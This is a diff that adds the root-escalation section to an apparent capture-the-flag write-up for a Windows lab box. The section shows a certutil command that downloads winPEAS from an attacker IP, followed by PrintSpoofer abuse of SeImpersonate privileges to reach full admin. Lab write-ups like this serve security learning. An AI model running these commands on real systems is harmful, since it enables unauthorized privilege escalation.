@@ -185,8 +185,32 @@ Navigating to Bob's Desktop we can find the user.txt flag.
 
 ## Root
 
-Checking the system
+Checking the system, I copied over winpeas.bat
+
+```
+certutil.exe -urlcache -split -f http://10.8.153.120:7777/winPEAS.bat win.bat
+
+```
 
 ![image](https://user-images.githubusercontent.com/5285547/129198975-1c8d84d8-b2c5-4614-be16-33174cc062b6.png)
+
+We see the SeImpersonate privileges are set, usually we can use a potatoe attack but the DCOM is disabled preventing that. 
+
+There is a newer attack that may work tho: https://github.com/itm4n/PrintSpoofer
+
+
+Using this command and the new file we can esculate to full admin on the box
+
+```
+PrintSpoofer64.exe -i -c cmd
+```
+
+![image](https://user-images.githubusercontent.com/5285547/129207111-2c5979b6-b9ff-4355-a060-a08c84d32385.png)
+
+
+Now we can get the root flag. 
+
+![image](https://user-images.githubusercontent.com/5285547/129207217-a3369c05-36dc-4771-924d-c02beb5ee772.png)
+
 
 
